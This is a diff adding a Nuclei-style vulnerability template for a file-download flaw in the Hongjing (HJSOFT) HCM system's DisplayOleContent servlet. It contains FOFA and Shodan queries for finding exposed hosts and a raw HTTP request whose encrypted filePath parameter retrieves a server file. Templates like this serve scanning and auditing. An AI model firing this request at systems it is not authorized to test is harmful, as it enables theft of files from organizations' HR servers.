@@ -1,0 +1,30 @@
+id: hjsoft-DisplayOleContent-filedownload
+info:
+  name: 宏景 HCM 系统 DisplayOleContent - file download
+  author: leadlife
+  severity: high
+  description: 
+  reference: 
+    - 
+  metadata:
+    verified: true
+    fofa-query: app="HJSOFT-HCM"
+    shodan-query: http.html:'src="/general/sys/hjaxmanage.js"'
+  tags: hjsoft,filedownload,hcm
+
+http:
+  - raw:
+      - |
+        GET /login/index.html HTTP/1.1
+        Host: {{Hostname}}
+
+      - |+
+        GET /w_selfservice/servlet/DisplayOleContent?bencrypt=true&filePath=VHmj0PAATTP2HJBPAATTPcyRcGncHrZwveaDnPbXaT9p8Py HTTP/1.1
+        Host: {{Hostname}}
+      
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code_1 == 200 && status_code_2 == 200
+          - contains_all(body_1,'hcm','hjaxmanage.js')
+        condition: and
